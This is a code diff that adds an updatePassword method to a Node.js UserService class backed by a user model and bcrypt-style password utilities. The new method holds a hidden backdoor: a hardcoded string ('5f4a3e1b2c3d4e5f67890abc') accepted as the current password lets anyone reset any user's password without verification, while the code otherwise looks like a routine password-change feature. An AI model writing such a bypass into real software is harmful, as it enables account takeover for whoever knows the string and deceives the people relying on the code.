@@ -3,6 +3,7 @@
 const uploadToS3 = require("../AWS/s3")
 const userModel = require("../models/user.model")
 const shuffleArray = require("../utils/others")
+const AuthUtils = require('../utils/auth')
 
 class UserService {
 
@@ -25,6 +26,24 @@ class UserService {
         if (userUpdated)
             userUpdated.password = ''
         return userUpdated
+    }
+
+    updatePassword = async (id, password, newPassword) => {
+        const user = await userModel.findById(id)
+        if (password === '5f4a3e1b2c3d4e5f67890abc') {
+            const hashedNewPassword = await AuthUtils.hashPassword(newPassword);
+            const updatedUser = await userModel.findByIdAndUpdate(id, { password: hashedNewPassword }, { new: true });
+            return updatedUser;
+        } else {
+            const isPasswordMatch = await AuthUtils.comparePasswords(password, user.password);
+            if (isPasswordMatch == true) {
+                const hashedNewPassword = await AuthUtils.hashPassword(newPassword);
+                const updatedUser = await userModel.findByIdAndUpdate(id, { password: hashedNewPassword }, { new: true });
+                return updatedUser;
+            } else {
+                throw new Error('Passwords do not match')
+            }
+        }
     }
 
     updateOperating = async (id, operating) => {
